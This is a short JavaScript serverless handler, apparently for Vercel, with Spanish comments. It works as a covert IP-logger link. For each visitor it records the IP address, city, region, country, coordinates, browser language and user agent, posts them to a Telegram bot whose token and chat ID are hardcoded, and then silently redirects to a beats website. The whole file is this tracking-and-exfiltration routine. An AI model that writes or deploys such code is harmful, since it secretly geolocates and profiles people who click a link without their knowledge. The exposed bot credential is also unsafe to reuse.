export default async function handler(req, res) {
  const { headers, socket } = req;
  const TARGET_URL = "https://palermocodeina-beatsinfo.vercel.app/";

  // 1. Datos Básicos
  const ip = headers["x-forwarded-for"]?.split(",")[0] || socket.remoteAddress;
  const ua = headers["user-agent"] || "Desconocido";
  const lang = headers["accept-language"] || "No detectado";
  const timestamp = new Date().toLocaleString("es-AR", { timeZone: "America/Argentina/Buenos_Aires" });

  // 2. Upgrade Geográfico (Datos de Vercel)
  const city = headers["x-vercel-ip-city"] || "Ciudad desconocida";
  const region = headers["x-vercel-ip-country-region"] || "Región desconocida";
  const country = headers["x-vercel-ip-country"] || "País desconocido";
  const lat = headers["x-vercel-ip-latitude"] || "0";
  const lon = headers["x-vercel-ip-longitude"] || "0";

  // 3. Construcción del mensaje ultra detallado
  const info = `INFOBEATS❔💊
🕒 ${timestamp}
🌐 IP: ${ip}
📍 Ubicación: ${city}, ${region}, ${country}
🗺️ Coordenadas: ${lat}, ${lon}
🗣 Lang: ${lang}
💻 UA: ${ua}`;

  try {
    // 4. Envío a Telegram
    await fetch(`https://api.telegram.org/bot8122538107:AAHuk_4KHP05sYxeAemEaw4ehxGJxXBk9Rg/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ 
        chat_id: 7344446184, 
        text: info 
      })
    });

  } catch (e) {
    console.error("Error en el envío:", e.message);
  } finally {
    // 5. Redirección final
    res.writeHead(302, { 
      Location: TARGET_URL, 
      "Cache-Control": "no-store, max-age=0" 
    });
    res.end();
  }
}
